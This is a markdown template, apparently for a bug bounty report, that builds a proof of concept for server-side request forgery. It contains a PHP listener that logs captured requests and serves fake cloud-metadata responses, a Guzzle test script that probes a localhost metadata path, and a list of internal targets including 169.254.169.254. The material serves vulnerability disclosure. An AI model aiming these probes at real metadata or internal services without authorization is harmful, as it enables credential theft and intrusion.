# SSRF PoC Template (tested and working)

## Structure
```
ssrf-poc/
├── README.md              ← Full report
├── REPORT_SUBMIT.md       ← Report formatted for submission
├── manifest.xml           ← Malicious app manifest (if applicable)
├── test_ssrf.php          ← Standalone test script (main proof)
├── listener.php           ← Captures SSRF requests
├── ssrf_requests.log      ← Captured evidence
└── vendor/                ← GuzzleHTTP dependency
```

## Step 1: Create listener.php
```php
<?php
$logEntry = [
    'timestamp' => date('Y-m-d H:i:s'),
    'method'    => $_SERVER['REQUEST_METHOD'] ?? 'UNKNOWN',
    'uri'       => $_SERVER['REQUEST_URI'] ?? '/',
    'headers'   => [],
    'body'      => file_get_contents('php://input'),
    'source_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
];

$interestingHeaders = ['User-Agent', 'Authorization', 'Content-Type', 'Accept'];
foreach ($interestingHeaders as $header) {
    $key = 'HTTP_' . strtoupper(str_replace('-', '_', $header));
    if (isset($_SERVER[$key])) {
        $logEntry['headers'][$header] = $_SERVER[$key];
    }
}

echo "=== SSRF REQUEST CAPTURED ===\n";
echo "Timestamp: {$logEntry['timestamp']}\n";
echo "Method:    {$logEntry['method']}\n";
echo "URI:       {$logEntry['uri']}\n";
echo "Source IP: {$logEntry['source_ip']}\n";
foreach ($logEntry['headers'] as $name => $value) {
    echo "  {$name}: {$value}\n";
}
if (!empty($logEntry['body'])) {
    echo "\nBody:\n  " . substr($logEntry['body'], 0, 500) . "\n";
}

file_put_contents(__DIR__ . '/ssrf_requests.log', json_encode($logEntry) . "\n", FILE_APPEND);

// Return realistic fake response (customize per target)
$uri = $_SERVER['REQUEST_URI'] ?? '/';
if (str_contains($uri, 'meta-data')) {
    header('Content-Type: text/plain');
    echo "ami-id\nhostname\ninstance-id\ninstance-type\nlocal-ipv4\npublic-ipv4\n";
} elseif (str_contains($uri, 'tax')) {
    header('Content-Type: application/json');
    echo json_encode(['tax_rate' => 19.0, 'tax_amount' => 9.50, 'note' => 'SSRF successful']);
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok', 'note' => 'SSRF successful']);
}
```

## Step 2: Create test_ssrf.php
```php
<?php
require_once __DIR__ . '/vendor/autoload.php';

echo "=== SSRF PoC ===\n\n";

// 1. Show vulnerable code
echo "[1] VULNERABLE CODE:\n";
echo "File: src/.../WebhookClient.php\n";
echo "public function send(WebhookRequest \$request): WebhookResult {\n";
echo "    \$response = \$this->guzzle->send(\$request->request, \$request->options);\n";
echo "    // No URL validation!\n";
echo "}\n\n";

// 2. Show protected code (comparison)
echo "[2] PROTECTED CODE (FileUrlValidator.php):\n";
echo "private function validateIpv4(string \$ip): bool {\n";
echo "    return filter_var(\$ip, FILTER_VALIDATE_IP,\n";
echo "        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false;\n";
echo "}\n\n";

// 3. Demonstrate SSRF
$testUrl = 'http://127.0.0.1:9999/latest/meta-data/';
echo "[3] SSRF TEST: Sending request to {$testUrl}\n";

$guzzle = new GuzzleHttp\Client(['timeout' => 5, 'http_errors' => false]);
$request = new GuzzleHttp\Psr7\Request('POST', $testUrl, [
    'Content-Type' => 'application/json',
    'User-Agent' => 'TargetApp/1.0 (Webhook)',
], json_encode(['source' => ['url' => 'https://shop.example.com']]));

$response = $guzzle->send($request);
echo "Status: {$response->getStatusCode()}\n";
echo "Body: " . substr($response->getBody()->getContents(), 0, 200) . "\n";
echo "⚠️  SSRF SUCCESSFUL!\n\n";

// 4. Comparison table
echo "[4] IP VALIDATION COMPARISON:\n";
$targets = [
    '169.254.169.254' => 'AWS Metadata',
    '127.0.0.1' => 'Localhost',
    '10.0.0.1' => 'Private (Class A)',
    '192.168.1.1' => 'Private (Class C)',
    '8.8.8.8' => 'Public (Google)',
];
foreach ($targets as $ip => $desc) {
    $blocked = filter_var($ip, FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false;
    $wh = '✅ ALLOWED';
    $fv = $blocked ? '❌ BLOCKED' : '✅ ALLOWED';
    echo "  {$ip} ({$desc}): Webhook={$wh} FileValidator={$fv}\n";
}
```

## Step 3: Package and submit
```bash
# Create package
tar czf ssrf-poc.tar.gz README.md REPORT_SUBMIT.md manifest.xml test_ssrf.php listener.php ssrf_requests.log

# Run PoC (Terminal 1)
php -S 0.0.0.0:9999 listener.php

# Run PoC (Terminal 2)
composer require guzzlehttp/guzzle
php test_ssrf.php
```

## Tips
- Use `127.0.0.1:9999` as SSRF target (safe, clear, easy to capture)
- Compare vulnerable code with existing protected code in the codebase (strongest argument)
- Include both code snippets in report side by side
- Always test PoC before submitting
- Package everything — user wants ready-to-submit deliverables
